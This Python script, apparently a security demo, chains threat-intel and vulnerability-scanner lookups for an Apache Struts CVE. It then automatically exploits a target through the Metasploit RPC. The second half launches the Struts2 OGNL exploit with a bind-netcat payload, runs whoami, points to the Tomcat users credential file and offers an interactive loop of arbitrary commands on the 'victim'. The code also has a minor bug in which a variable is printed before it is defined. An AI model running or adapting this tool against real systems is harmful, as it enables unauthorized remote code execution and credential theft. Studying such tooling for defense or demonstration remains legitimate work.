#!/usr/bin/env python

from lib.core.methods.scanners import CveScanners
from lib.core.methods.rules import CveRules
from lib.core.methods.exploit import CveExploit
from metasploit.msfrpc import MsfRpcClient
from pymisp import PyMISP
import json
import time
import os
import json
import urllib3
import pprint

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
sleep_time = 1 
#----------------------------------------------------------------------------------------
# setting metasploit variables
metasploit_login = os.environ['metasploit_login_id']
exploit_module = "exploit/multi/http/struts2_content_type_ognl"
payload = "cmd/unix/bind_netcat"
remote_ip = "x.x.x.x"
remote_port = "8080"
target_uri = "/struts2_2.3.15.1-showcase/showcase.action"
sessionid = 0
active_shell = True
#----------------------------------------------------------------------------------------
# search threat intel platform for actionable intels
misp_api_endpoint = 'http://x.x.x.x/events/index'
misp_key = os.environ['misp_key']
misp_verifycert = False
relative_path = ''
searchinfo = input("Enter a keyword you'd like to search in the Threat DB (defaul: struts): ")
searcheventid = input("Enter EventID (optional): ")
if not searcheventid:
    searcheventid = "1016"
body = ('{"searchinfo":"%s", "searchpublished":1, "searchdistribution":0, "searcheventid":"%s"}' % (searchinfo, searcheventid))
misp = PyMISP(misp_api_endpoint, misp_key, misp_verifycert)
search_results = misp.direct_call(relative_path, body)
data = json.dumps(search_results,sort_keys=True,indent=4)

print ("\nSearching MISP Threat Intelligence Platform for 'struts' vulnerability... ")
time.sleep(sleep_time)
print (data)
misp_results = json.loads(data)
print("\nFocusing on what matters...\n")
results = misp_results['response'][0]['info']
print(results, "\n")

cve = results.split('(')
cve = cve[1]
cve = cve.split(')')
cve = cve[0]
time.sleep(sleep_time)

# ----------------------------------------------------------------------------------------
# search through the assessment tools
contiue_script = input("\nWould you like to search for 'struts' in the OpenVAS CVE Assessment Tool? ")
if "y" in contiue_script or "Y" in contiue_script:
    pass
else:
    print ("Exiting script...")
    quit()
    
print ("\nSearching OpenVas DB for 'struts' associated CVEs...")
time.sleep(sleep_time)
# search openvas db
openvas = CveScanners(cve).get_openvas()
if openvas != "null":
    print("\nCVE found in OpenVAS Vulnerability Database\n", openvas)
else:
    print ("\nThreat was not found in OpenVAS Vulnerability Database\n")

#search through the assessment tools
contiue_script = input("\nWould you like to continue your search for 'struts' in the Nessus CVE Assessment Tool? ")
if "y" in contiue_script or "Y" in contiue_script:
    pass
else:
    print ("Exiting script...")
    quit()

print ("\nSearching Nessus DB for 'struts' associated CVEs...")
time.sleep(sleep_time)
# search nessus db
nessus = CveScanners(cve).get_nessus()
if nessus != "null":
    print("\nCVE found in Nessus Vulnerability Database\n", nessus)
else:
    print ("\nThreat was not found in Nessus Vulnerability Database\n")

#search through the assessment tools
contiue_script = input("\nWould you like to continue your search for 'struts' in the OVAL CVE Assessment Tool? ")
if "y" in contiue_script or "Y" in contiue_script:
    pass
else:
    print ("Exiting script...")
    quit()

print ("\nSearching OVAL DB for 'struts' associated CVEs...")
time.sleep(sleep_time)
# search oval db
oval = CveScanners(cve).get_oval()
if oval != "null":
    print("\nCVE found in Oval Vulnerability Database\n", oval)
else:
    print ("\nThreat was not found in OVAL Vulnerability Database\n")

# search through the assessment tools
contiue_script = input("\nWould you like to continue your search for 'struts' in the Nmap NSE Assessment Tool? ")
if "y" in contiue_script or "Y" in contiue_script:
    pass
else:
    print ("Exiting script...")
    quit()

print ("\nSearching Nmap DB for 'struts' associated CVEs...")
time.sleep(sleep_time)
# search nmap db
nmap = CveScanners(cve).get_nmap()
if nmap != "null":
    print("\nCVE found in Nmap Vulnerability Database\n", nmap)
else:
    print ("\nThreat was not found in Nmap Vulnerability Database\n")

# ----------------------------------------------------------------------------------------
# search for snort rules
contiue_script = input("\nWould you like to search to see if Snort rules exist to prevent this attack? ")
if "y" in contiue_script or "Y" in contiue_script:
    pass
else:
    print ("Exiting script...")
    quit()

print ("\nSearching Snort DB for rules to prevent 'struts' exploitation...")
time.sleep(sleep_time)
# search metasplpoit (msf) for exploits
snort = CveRules(cve).get_snort()
if snort != "null":
    print("\nFound Rules to prevent 'struts' attacks in Snort Database\n", msf)
else:
    print ("\nThreat was not found in Snort Rules Database\n")

#----------------------------------------------------------------------------------------
# search through the assessment tools
contiue_script = input("\nWould you like to search for available 'struts' exploits? ")
if "y" in contiue_script or "Y" in contiue_script:
    pass
else:
    print ("Exiting script...")
    quit()

print ("\nSearching Metasploit DB for related 'struts' explopits...")
time.sleep(sleep_time)
# search metasplpoit (msf) for exploits
msf = CveExploit(cve).get_msf()
if msf != "null":
    print("\nCVE found in Metasploit Vulnerability Database\n", msf)
else:
    print ("\nThreat was not found in Metasploit Vulnerability Database\n")

print ("We are now going to exploit this cve with our automated exploit tool...\n")
contiue_script = input("\nAre you ready to run the exploit...? ")
if "y" in contiue_script or "Y" in contiue_script:
    pass
else:
    print ("Exiting script...")
    quit()

split_msf = msf.split("exploits/")
split_msf = split_msf[1]
split_msf = split_msf.split(".rb")
module = split_msf[0]

print ("Creating a metasploit service...\n")
# create a metasploit object
msfrpc_obj = MsfRpcClient(metasploit_login)
if msfrpc_obj:
    print ("Successfully created client service...")
else:
    print ("Oops! Something went wrong...")
# create a metasploit modules object
exploit_list = msfrpc_obj.modules.exploits

print ("starting attack on victim: ", remote_ip)
exploit = msfrpc_obj.modules.use('exploit', exploit_module)
exploit['RHOSTS'] = remote_ip
exploit['RPORT'] = remote_port
exploit['TARGETURI'] = target_uri
exploit['VERBOSE']= False
exploit.execute(payload=payload)

session_list = msfrpc_obj.sessions.list
data = json.dumps(session_list)
current_session = data[2:3]
if not current_session:
    print ("There is no Metasploit sessions...")
    pass
else:
    print ("Current Metasploit sessionID: ", current_session)
    current_session = int(current_session)

while (not current_session) or (current_session == 0):
    exploit.execute(payload=payload)
    print ("Creating a new Metasploit session...")
    session_list = msfrpc_obj.sessions.list
    data = json.dumps(session_list)
    current_session = data[2:3]
    current_session = int(current_session)
    print ("Metasploit sessionID: ", current_session)

print ("Interactive shell's active... Quit anytime by typing 'exit'")
if current_session >= 1:
    sessionid = current_session
    shell = msfrpc_obj.sessions.session(sessionid)
    shell.write('whoami\n')
    print ("Current user: ", shell.read())
    print ("Tomcat Users Location: /usr/local/tomcat/conf/tomcat-users.xml")
    print ("\n")
else:
    print ("Oops! something went wrong! Check sessionID")
    quit()

while active_shell:
    interactive_shell = input('Run a command against victim: ')
    if ("exit" not in interactive_shell) or (not interactive_shell):
        new_shell = msfrpc_obj.sessions.session(sessionid)
        new_shell.write(interactive_shell +'\n')
        print ("command results: ", new_shell.read())
    else:
        active_shell = False
    
print ("Exiting script now...\n")
print ("Thank you for using Chicago CyberSecurity Demo script...")
quit()